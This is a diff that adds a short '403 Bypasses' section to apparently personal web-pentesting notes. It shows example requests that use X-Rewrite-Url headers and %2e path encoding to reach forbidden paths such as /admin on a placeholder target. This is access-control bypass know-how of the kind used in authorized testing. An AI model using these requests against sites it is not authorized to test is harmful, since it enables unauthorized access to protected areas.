@@ -182,6 +182,31 @@ Sometimes messings with certain headers can modify the behaviour of an applicati
 
 While bruteforcing URLs can set "Host: Localhost" for potentially more access
 
+## 403 Bypasses
+
+X-Rewrite-Url or X-original-url can be used to bypass 403s due to differences between frontend and backend blocking.
+
+Instead of
+```
+GET /admin HTTP/1.1
+Host: target.com
+```
+Try
+```
+GET / HTTP/1.1
+Host: target.com
+X-Rewrite-Url: admin
+```
+Adding special characters to URLS can sometimes bypass 403s. Instead of
+```
+https://target.com/path
+```
+Try
+```
+https://target.com/%2e/path
+```
+
+
 ## Open Redirect
 
 Walk the page with burpsuite, interact wherever you can. Once you are done Analyze the target, look for potential parameters (GET and POST) like:
